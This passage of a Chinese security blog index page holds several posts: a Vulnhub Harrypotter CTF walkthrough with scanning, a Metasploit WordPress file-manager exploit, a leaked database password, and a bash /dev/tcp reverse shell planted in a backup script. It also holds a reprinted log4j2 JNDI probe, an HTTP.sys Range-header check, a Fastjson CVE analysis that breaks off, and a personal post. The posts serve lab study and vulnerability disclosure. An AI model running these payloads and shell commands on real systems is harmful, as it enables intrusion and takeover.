+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页只有一张图片：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.104 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Ar/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现一个blog目录，可以去看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.104，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wpscan漏洞发现">wpscan漏洞发现</span></h3><blockquote>
+<p>1.直接访问192.168.56.104&#x2F;blog，发现页面提示是使用WordPress搭建的blog，想访问Notice等页面的内容和使用wpscan进行扫描，要添加一下host：</p>
+<p><img src="/2022/08/08/Harrypotter-Ar/7.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Ar/8.png" alt="image-"></p>
+<p>2.再利用wpscan扫描得到漏洞，–pluguns-detection aggressive模式下有几个漏洞，都是有关file manager的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordpress.aragog.hogwarts/blog --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/9.png" alt="image-"></p>
+</blockquote>
+<h3><span id="msf-getshell">msf getshell</span></h3><blockquote>
+<p>1.我们可以利用msf查找可用的file manager利用工具，配置后进行shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search file manager wordpress，查看相关漏洞利用工具</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/http/wp_file_manager_rce -y，漏洞工具选择</span><br><span class="line">set TARGETURI /blog，配置URI</span><br><span class="line">set RHOSTS wordpress.aragog.hogwarts，配置远程地址</span><br><span class="line">set LHOST 192.168.56.102，配置本地地址</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/11.png" alt="image-"></p>
+<p>2.再利用python，获取一个ttyshell，查询目录，在&#x2F;home&#x2F;hagrid98下能找到第一个flag，horcrux1.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c ‘import pty; pty.spawn(“/bin/bash”);’</span><br><span class="line">cat /home/hagrid98/horcrux1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/12.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Ar/13.png" alt="image-"></p>
+</blockquote>
+<h3><span id="mysql登录进行提权">mysql登录，进行提权</span></h3><blockquote>
+<p>1.在&#x2F;etc&#x2F;wordpress目录下的config-defaut.php文件内能看到一个数据库密码，登录mysql后进入wordpress数据库查询wp_users表能够得到hagrid98的ssh登录密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/wordpress/config-default.php，得到root数据库密码</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/14.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p，登录mysql，密码为mySecr3tPass</span><br><span class="line">use wordpress;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/15.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Ar/16.png" alt="image-"></p>
+<p>2.进行ssh登录hagrid98，查找备份文件可以发现一个脚本：</p>
+<p><img src="/2022/08/08/Harrypotter-Ar/17.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*back*&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/18.png" alt="image-"></p>
+<p>3.在这里我们简单弹个shell，因为&#x2F;opt&#x2F;.backup.sh是被修改过的，我们也有权利进行修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.102/5555 0&gt;&amp;1&#x27;&quot; &gt;&gt; /opt/.backup.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/19.png" alt="image-"></p>
+<p>4.从.backup.sh的文件内容看，&#x2F;tmp目录是可以进行拷贝等操作的，我们可以尝试把文件拷贝到&#x2F;tmp目录下执行，同时kali监听5555端口，并且网页访问&#x2F;tmp&#x2F;tmp_wp_uploads目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555，kali监听</span><br><span class="line">cp /opt/.backup.sh /tmp/.backup.sh</span><br><span class="line">cd /tmp</span><br><span class="line">./.backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>5.在root用户的&#x2F;root目录下能发现第二个flag，即horcrux2.txt：</p>
+<p><img src="/2022/08/08/Harrypotter-Ar/20.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Harrypotter/" rel="tag">Harrypotter</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/04/blue-horizon/">
+                蓝色的地平线
+            </a>
+        </h2>
+    
+    <time>
+        Aug 4, 2022
+    </time>
+    <section class="content">
+        <h1><span id="蓝色的地平线">蓝色的地平线</span></h1><p><img src="/2022/08/04/blue-horizon/1.jpg" alt="image"></p>
+<p>别问我为什么一个月多都没写博客感觉是面试通过了门面撑好了博客就不需要更新了(￣ε(#￣)☆╰╮o(￣皿￣&#x2F;&#x2F;&#x2F;)</p>
+<p>其实不然<del>（借口）</del>，主要是“搬家 + 居家隔离 + 天天核酸”的套餐搞得自己没有太多精力去把技术类的东西再搬过来……<del>你想让我说因为放了几个月假没上班最后能有几天就一直在玩 Monster Hunter Rise：Sunbreak吗？！</del></p>
+<p>所以嘛，到了现在我已经上了三个星期的班了，新工作环境还不错，但也多少有点压力，不过还好，至少现在我还能有时间在公司码几篇博客传上来，希望之后也有这样的时间来学习一些东西。</p>
+<p>现在工作上接触到漏洞的发现、验证、利用场景比较多，之后应该会多更新整合这方面的学习内容；还会接收到很多SRC过来的漏洞，也会学习学习手法（但大多都比较简单应该不会碎片化记录，整合下可能性微存？<del>懒</del>）</p>
+<p>欸，又回到这种每天白开水预设的生活了，该说要每天能给自己掺点有意思的东西比较好（于是就发生了快凌晨2点被提生产环境上线复测漏洞的情况）</p>
+<p><img src="/2022/08/04/blue-horizon/2.jpg" alt="image" title="差不多得了"></p>
+<p>「不要被他人所命令所急迫，自己要有自己的度量」</p>
+<p>话说今天是七夕欸，V我50(<em>´◐∀◐&#96;</em>)</p>
+<p>这篇文章叫“蓝色的地平线”（ブルー・ホライズン），是因为在写完这篇时，刚好随机到《记录的地平线》第三季ED，名为《ブルー・ホライズン》<del>（天国的第四季）</del>。</p>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/New-Start/" rel="tag">New Start</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/dnslog-log4j2/">
+                dnslog-log4j2
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="dnslog简单验证log4j2漏洞">dnslog简单验证log4j2漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://xingye.me/?p=444">星夜</a></p>
+</blockquote>
+<h2><span id="简单步骤">简单步骤</span></h2><blockquote>
+<p>进dnslog：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
+<p>Get SubDomain 得到一个随机的子域名</p>
+<p>拼进${jndi:ldap:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
+<p>往任意可能在log中塞的输入填</p>
+<p>这里拿tx玩，如群中发送，可得到tx云的记录</p>
+<p><img src="/2022/08/03/dnslog-log4j2/1.png" alt="image"></p>
+<p><img src="/2022/08/03/dnslog-log4j2/2.png" alt="image"></p>
+<p><img src="/2022/08/03/dnslog-log4j2/3.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Log4j2/" rel="tag">Log4j2</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+                HTTP.sys远程代码执行
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="渗透整理httpsys远程代码执行">【渗透整理】HTTP.sys远程代码执行</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42742658/article/details/106548456">久违 °</a></p>
+</blockquote>
+<h2><span id="漏洞介绍">漏洞介绍</span></h2><blockquote>
+<p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
+<p>影响环境：Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2&#x2F;Server 2012&#x2F;Server 2012 R2以及Windows 7&#x2F;8&#x2F;8.1操作系统都受到这个漏洞的影响。</p>
+</blockquote>
+<h2><span id="漏洞知识">漏洞知识</span></h2><blockquote>
+<p>说到HTTP.sys远程代码执行漏洞，不得不先介绍一下Range首部字段。</p>
+<p>在“上古时代”，网络并不是很好，下载大型文件很不容易。下载途中如果网络中断，就得重头开始下。为了解决这个问题，HTTP&#x2F;1.1引入了范围请求。</p>
+<p>在请求报文的Range首部字段中指定资源的byte范围，告诉服务器，请求的是资源哪个范围的内容，让断点续传和并行下载得以实现。</p>
+<p>如果服务器支持范围请求，响应包中就会存在Accept-Ranges字段(且值不为“none”，bytes为资源范围的单位)，并在Content-Length字段中告诉客户端资源的大小范围。</p>
+<p><img src="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="image"></p>
+<p>如果没有Accept-Ranges字段，则服务器可能不支持范围请求，有的服务器会明确将值设为“none”。</p>
+<p>服务器面对范围请求，有三种响应：</p>
+<p>请求成功：</p>
+<p>响应206Partial Content请求范围越界：（范围超过资源的大小）</p>
+<p>响应416Requested Range Not Satisfiable不支持范围请求：</p>
+<p>响应200OK</p>
+<p>而HTTP.sys远程代码执行漏洞正是利用Range字段注入恶意数据。该漏洞的检测，也是利用服务器面对范围请求时的响应特征来判断。</p>
+</blockquote>
+<h2><span id="漏洞检测方法">漏洞检测方法</span></h2><blockquote>
+<p>1、先判断目标环境是否为Windows+IIS</p>
+<p>2、然后构建Range字段进行检测即可</p>
+<p>检测时，在请求包中添加Range字段，如下：</p>
+<p><code>Range: bytes=0-18446744073709551615</code></p>
+<p>【18446744073709551615的十六进制为0xFFFFFFFFFFFFFFFF(16个F)是64位无符号整数所能表达的最大整数，整数溢出和这个超大整数有关】</p>
+<p>然后go给服务器</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: stuff</span><br><span class="line">Range: <span class="built_in">bytes</span>=<span class="number">0</span>-<span class="number">18446744073709551615</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v www.test.com -H <span class="string">&quot;Host: irrelevant&quot;</span> -H <span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>服务器响应 400，证明不存在HTTP.sys远程代码执行漏洞</p>
+<p><code>HTTP Error 400. The request has an invalid header name.</code></p>
+<p>服务器响应 416，则证明存在该漏洞</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">416</span> Requested Range Not Satisfiable</span><br><span class="line">Content-<span class="type">Type</span>: text/html</span><br><span class="line">Last-Modified: Thu, <span class="number">22</span> Aug <span class="number">2013</span> <span class="number">23</span>:<span class="number">53</span>:<span class="number">12</span> GMT</span><br><span class="line">Accept-Ranges: <span class="built_in">bytes</span></span><br><span class="line">ETag: <span class="string">&quot;2edebc2929fce1:0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞修复建议">漏洞修复建议：</span></h2><blockquote>
+<p>升级安全补丁</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/CVE-2022-25845-Fastjson/">
+                CVE-2022-25845 – Fastjson
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-25845-fastjson-auto-type-bypass-rce漏洞分析">CVE-2022-25845 – Fastjson “Auto Type Bypass” RCE漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d4702da8b93e?u_atoken=e8be5a2e-d2f2-40e8-9032-eb762ac70e4d&u_asession=016gAHNAGW5kwEmr9SHcziNNztkuT3HPV9Qi1BUpHrLJq9hEVlxH_k1w9FiGt4iz1TX0KNBwm7Lovlpxjd_P_q4JsKWYrT3W_NKPr8w6oU7K_nesHWq-uvzShryNdruwb_Ppcarp92QKzyJKyYjREPlmBkFo3NEHBv0PZUm6pbxQU&u_asig=0571xFqT6ytNlYS2FmxKjAUaC7IIZzHH_wNoBkl0fuXB7L7i_BKRMiYdR7WkEyOH04jON-Y6ZkqCQaLBYWgAvEfdDsRAMInmkstRXd3gA_02JitfEM0sXqs1ygakF_Gssvi8K917w5adBQOQPWp0fT6NXrc-haXIlf4ev16Nwyo_H9JS7q8ZD7Xtz2Ly-b0kmuyAKRFSVJkkdwVUnyHAIJze09tESGin2xLknH8nQ1NfDH10X8edffiTaObeVvRyl4WPRPQyB_SKrj-61LB_f61u3h9VXwMyh6PgyDIVSG1W88Y2fYLRHbT4ia04fxhHA1ybLonYZfH1eNUN_6rAKYnOe2A-SmkXiAo5UbaV32iFMBBLacmUFwtytO_4ZvRIY1mWspDxyAEEo4kbsryBKb9Q&u_aref=ErhmyQTxFTESTC8Ph/fkOki3fC0=">vayci</a></p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>几周前， Fastjson 发布了一个新版本 (1.2.83) ，其中包含一项安全漏洞修复。据称攻击者可以利用此漏洞在远程机器上执行代码。根据发布的多篇文章，攻击者通过漏洞可以绕过Fastjson中的“AutoTypeCheck”机制，完成远程代码执行。</p>
+<p>这个 Fastjson 漏洞最近才收到一个 CVE 漏洞标识符 – CVE-2022-25845，以及高达8.1的CVSS漏洞评分。尽管如此，这个漏洞仍扑朔迷离。尽管这是被宣称为在无处不在的组件中存在的一个高危RCE漏洞（将近5000个Maven项目都存在Fastjson依赖！），却几乎没有任何关于它的公开技术细节。到底是哪里存在漏洞，又是在什么条件下容易被攻击？</p>
+<p>在本篇文章中，我们深入研究了这个Fastjson漏洞的严重性，以及那些类型的Java应用程序受此影响。文末是给目前无法升级到指定Fastjson版本的开发人员的一些策略建议。</p>
+</blockquote>
+<h2><span id="哪些情况会受到cve-2022-25845漏洞的影响">哪些情况会受到CVE-2022-25845漏洞的影响？</span></h2><blockquote>
+<p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 JSON.parse 或 JSON.parseObject 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p>
+<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/1.png" alt="image" title="存在潜在风险的API和安全API的不完全示例"></p>
+<p>虽然看起来很宽泛，但是我们可以发现，在这些前提条件下，攻击者也只能通过这个漏洞调用特定类型的Java反序列化gadget（继承Throwable类的gadget类），这大大限制了这个漏洞的实际影响。</p>
+</blockquote>
+<h2><span id="技术深入探究">技术深入探究</span></h2><blockquote>
+<p>Fastjson 是一个 Java 库，可以将 Java 对象序列化和反序列化，实现Java对象和JSON的相互转换。</p>
+<p>和大多数 JSON 类一样，Fastjson 支持将基本 JSON 类型（数组和对象）分别序列化和反序列化为它们的 Java 等价对象——Arrays 和 Maps。</p>
+<p>然而，Fastjson也可以将用户的Java对象（POJO）序列化为JSON，或从JSON反序列化为Java对象。</p>
+<p>例如，我们定义了一个名为User的类，以下代码时将其进行序列化为JSON，然后再进行反序列化。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">  <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">  <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> JSON.parseObject(jsonString, User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>JSON.parseObject()返回一个 JSONObject 对象， 然后这个对象又转换为User类。</p>
+<p>有时候，开发人员想要更灵活的代码来接收序列化的JSON，告诉代码JSON应该被反序列化为哪种类。例如下面这种JSON形式：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attr">&quot;users&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AdminUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GuestUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Fastjson 支持一个名为“AutoType”的功能。启用该功能后，可以为每个用户entry引入类型。开发人员只需要调用如下代码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Feature.SupportAutoType);</span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">users</span> <span class="operator">=</span> (JSONArray)obj.get(<span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="comment">// Users[0] is of class type &quot;AdminUser&quot;</span></span><br><span class="line"><span class="comment">// Users[1] is of class type &quot;GuestUser&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>但是，如果反序列化的JSON是用户可以控制的，则在启用AutoType的情况下对其进行解析可能会出现反序列化安全问题。因为攻击者可以实例化Classpath上可用的任意类，并为类的构造函数提供任意参数。这个问题已经被很多次证实确实可以利用，并且例如ysoserial之类的框架就存在这里攻击手段的风险（Java的“gadget”类）。</p>
+<p>因此，Fastjson的开发者选择默认禁用了AutoType功能，这应该能够安全地解析人员JSON数据了。但是，AutoType的机制比这复杂得多…</p>
+</blockquote>
+<h2><span id="绕过-autotype-默认禁用策略">绕过 AutoType 默认禁用策略</span></h2><blockquote>
+<p>当JSON.parseObject()被调用时，它最终会调用到 DefaultJSONParser.parseObject()，并且传入参数 object 为 JSONObject，fieldName 为 null。当这个方法遇到“@type”这个符号（JSON.DEFAULT_TYPE_KEY）时，就会调用config.checkAutoType：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最终，在所有flag都是默认的情况下，代码会调用至config.checkAutoType()。在这里，我们可以看到因为被列入黑名单而无法通过AutoType 机制实例化的类列表。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">expectHash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">            <span class="keyword">if</span> (expectHash == <span class="number">0x90a25f5baa21529eL</span></span><br><span class="line">                    || expectHash == <span class="number">0x2d10a5801b9d6136L</span></span><br><span class="line">                    || expectHash == <span class="number">0xaf586a571e302c6bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xed007300a7b227c6L</span></span><br><span class="line">                    || expectHash == <span class="number">0x295c4605fd1eaa95L</span></span><br><span class="line">                    || expectHash == <span class="number">0x47ef269aadc650b4L</span></span><br><span class="line">                    || expectHash == <span class="number">0x6439c4dff712ae8bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xe3dd9875a2dc5283L</span></span><br><span class="line">                    || expectHash == <span class="number">0xe2a8ddba03e69e0dL</span></span><br><span class="line">                    || expectHash == <span class="number">0xd734ceb4c3e9d1daL</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这些被Ban的类是以下这些：</p>
+<ul>
+<li>java.lang.Object</li>
+<li>java.io.Serializable</li>
+<li>java.lang.Cloneable</li>
+<li>java.lang.Runnable</li>
+<li>java.lang.AutoCloseable</li>
+<li>java.io.Closeable</li>
+<li>java.lang.Iterable</li>
+<li>java.util.Collection</li>
+<li>java.lang.Readable</li>
+<li>java.util.EventListener</li>
+</ul>
+<p>你也可以在 fastjson-blacklist 查看到更多被列入黑名单的类。这个仓库维护了被列入Fastjson黑名单的类的hash值。</p>
+<p>最后，代码将尝试找到一个反序列化器deserializer，用来对这个已经被JSON序列化的类进行反序列化。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"><span class="type">Class</span> <span class="variable">deserClass</span> <span class="operator">=</span> deserializer.getClass();</span><br><span class="line"><span class="keyword">if</span> (JavaBeanDeserializer.class.isAssignableFrom(deserClass)</span><br><span class="line">    &amp;&amp; deserClass != JavaBeanDeserializer.class</span><br><span class="line">    &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> MapDeserializer) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 ParserConfig.getDeserializer()内部，有一个关键检查，用于验证目标类是否继承了 Throwable 类：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    deserializer = <span class="keyword">new</span> <span class="title class_">ThrowableDeserializer</span>(<span class="built_in">this</span>, clazz);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
